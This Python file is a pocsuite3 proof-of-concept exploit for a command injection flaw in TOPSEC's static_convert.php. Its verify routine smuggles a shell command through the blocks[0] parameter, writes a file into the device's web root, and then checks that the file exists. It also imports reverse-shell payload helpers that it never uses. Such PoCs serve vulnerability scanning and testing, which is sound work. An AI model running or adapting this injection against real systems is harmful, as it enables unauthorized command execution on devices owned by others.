# _*_ coding:utf-8 _*_
# @Time : 2024/1/3


from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str


class trx_topsec_static_convert_rce(POCBase):
    pocDesc = '''天融信TOPSEC static_convert 远程命令执行漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-3'
    name = '天融信TOPSEC static_convert 远程命令执行漏洞'

    def _verify(self):

        result = {}
        path = """/view/IPV6/naborTable/static_convert.php?blocks[0]=|| echo '123456' >> /var/www/html/test.txt"""
        path1= "/test.txt"
        check_url = self.url + path1
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36"

        }
        url = self.url + path

        try:
            response = requests.get(url, headers=headers)
            if response.status_code == 200 and '123456' in response.text:
                response1 = requests.get(check_url)
                if response1.status_code == 200 and '123456' in response1.text:
                    result['VerifyInfo'] = {}

            return self.parse_output(result)
        except Exception as e:
            pass


register_poc(trx_topsec_static_convert_rce)